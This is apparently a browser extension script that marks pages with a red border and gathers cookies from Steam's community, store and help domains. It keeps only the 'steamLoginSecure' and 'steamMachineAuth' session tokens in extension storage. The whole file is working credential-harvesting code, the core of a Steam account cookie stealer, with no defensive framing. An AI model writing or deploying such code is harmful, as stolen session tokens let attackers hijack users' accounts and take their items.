document.body.style.border = "5px solid red";

var domains = ["*://steamcommunity.com/*", "*://store.steampowered.com/*", "*://help.steampowered.com/*"]

function onError(error){
    console.log(error)
}

function isCookieInteresting(cookie){
    return cookie.name === "steamLoginSecure" || cookie.name.includes("steamMachineAuth")
}

function rememberCookie(cookie){
    var storingNote = browser.storage.local.set({ [cookie.name] : cookie });
    storingNote.then(() => {}, onError)
}

function saveAllTheInterestingCookies(cookieList){
    for(let cookie of cookieList){
        if(isCookieInteresting(cookie)){
            rememberCookie(cookie)
        }
    }
}

function saveCookiesForDomain(domain){
    var promiseOfCookies = browser.cookies.getAll({url: domain});
    promiseOfCookies.then(saveAllTheInterestingCookies);
}

function sniffForCookies(){
    for(let domain of domains){
        saveCookiesForDomain(domain)
    }
}

sniffForCookies()